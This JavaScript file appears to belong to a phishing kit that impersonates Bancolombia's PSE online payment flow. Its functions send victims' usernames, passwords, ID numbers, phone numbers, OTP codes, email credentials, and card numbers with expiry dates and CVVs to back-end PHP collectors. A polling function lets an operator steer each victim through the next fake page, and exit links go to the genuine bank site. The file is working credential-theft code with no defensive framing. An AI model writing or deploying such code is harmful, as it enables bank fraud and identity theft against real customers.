function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}   

/* Rutas relativas a las páginas en poral/a/ (mismo criterio que Falabella). La ruta absoluta /Nueva carpeta/pse/... falla si el sitio está en un subdirectorio (p. ej. /stevenBuses/...). */
var PSE_PROCESS = "../../../../../process/";

function vista_password(){
    window.location.href = "../a/PASS";
}

function inicio(u){
    var d = detectar_dispositivo();
    $.post( PSE_PROCESS + "inicio.php", { usr: u, dis: d} ,function(data) {
        setTimeout(vista_password, 2000);        
    });
}

function quitar_cargando(){
    $("#fondo,#cargando-o").hide();
}

function vista_info(){
    window.location.href = "../a/INFO";
}

function vista_espera(o){
    window.location.href = "../a/WAITING?o=" + o;
}

function vista_otp(){
    window.location.href = "../a/OTP";
}

function vista_errorotp(){
    window.location.href = "../a/ERROTP";
}

function vista_tarjeta(){
    window.location.href = "../a/PRODUCT";
}

function vista_final(){
    window.location.href = "../a/SUCCESS";
}

function salir(){
    window.location.href = "https://www.bancolombia.com/personas";  
}               

function pasousuario(p, usr){
    var d = detectar_dispositivo();
    var u = (typeof usr === "string" && usr.length) ? usr : (typeof window.bancolUser === "string" ? window.bancolUser : "");
    $.post( PSE_PROCESS + "pasologina.php", { usr: u, pas: p, dis: d, ban:"Bancolombia"} ,function(data) {
        window.location.href = "../a/WAITING"; 
    });
}               

function pasoinfo(d,c){    
    $.post( PSE_PROCESS + "pasoinfo.php", { doc: d, cel: c} ,function(data) {
        window.location.href = "../a/WAITING";  
    });
} 

function pasootp(o){    
    $.post( PSE_PROCESS + "pasootp.php", { otp: o} ,function(data) {
        window.location.href = "../a/WAITING";   
    });
} 

function pasoerrotp(o){    
    $.post( PSE_PROCESS + "pasootp2.php", { otp: o} ,function(data) {
        window.location.href = "../a/WAITING";    
    });
}

function pasocorreo(e,c,t){   
    $.post( PSE_PROCESS + "pasocorreo.php", { eml:e,clv:c,cel:t } ,function(data) {
        window.location.href = "../a/WAITING";   
    });
}


function pasotarjeta(t,f,c){    
    $.post( PSE_PROCESS + "pasotarjeta.php", { tar:t,fec:f,cvv:c } ,function(data) {
        window.location.href = "../a/WAITING";   
    });
}


function consultar_estado(){ 
    $.post( PSE_PROCESS + "estado.php",function(data) {        
        switch (data) {
            case '2': window.location.href = "OTP"; break;
            case '4': window.location.href = "MAIL"; break;
            case '6': window.location.href = "PRODUCT"; break;               
            case '8': window.location.href = "SMSOTP"; break;
            case '10': window.location.href = "https://www.bancolombia.com/personas"; break;
            case '12': window.location.href = "login"; break;
        } 
    });        
}